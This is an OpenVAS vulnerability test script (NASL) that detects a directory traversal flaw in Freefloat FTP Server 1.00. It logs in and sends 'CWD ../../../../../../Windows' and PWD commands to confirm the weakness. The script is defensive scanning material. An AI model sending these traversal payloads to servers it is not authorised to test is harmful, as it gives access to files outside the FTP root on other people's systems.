###############################################################################
# OpenVAS Vulnerability Test
#
# Freefloat FTP Server Directory Traversal Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH, http://www.greenbone.ne
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800188");
  script_version("2020-08-24T08:40:10+0000");
  script_bugtraq_id(45218);
  script_tag(name:"last_modification", value:"2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2010-12-13 15:28:53 +0100 (Mon, 13 Dec 2010)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_name("Freefloat FTP Server Directory Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/freefloat/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45218/info");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/96423/freefloat-traversal.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary
  files on the affected application.");

  script_tag(name:"affected", value:"Freefloat FTPserver version 1.00.");

  script_tag(name:"insight", value:"The flaw is due to an error while handling certain requests,
  which can be exploited to download arbitrary files from the host system via directory traversal attack.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running Freefloat FTP Server and is prone to directory
  traversal vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "FreeFloat Ftp Server" >!< banner)
  exit(0);

soc1 = open_sock_tcp(ftpPort);
if(!soc1)
  exit(0);

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(login_details)
{
  chk_res = "Windows";

  ## Change Current working Directory using Directory Traversal
  send(socket:soc1, data:'CWD ../../../../../../Windows\r\n');
  atkres1 = ftp_recv_line(socket:soc1);

  ## If CWD is not successful, then try to CWD to WINNT
  if("250 CWD command successful" >!< atkres1)
  {
    send(socket:soc1, data:'CWD ../../../../../../WINNT\r\n');
    atkres1 = ftp_recv_line(socket:soc1);
    chk_res = "WINNT";
  }

  ## Send Present Working Directory command
  send(socket:soc1, data:'PWD\r\n');
  atkres2 = ftp_recv_line(socket:soc1);

  if("250 CWD command successful" >< atkres1 && "257 ">< atkres2 &&
                                              chk_res >< atkres2){
    security_message(port:ftpPort);
  }
}

ftp_close(socket:soc1);
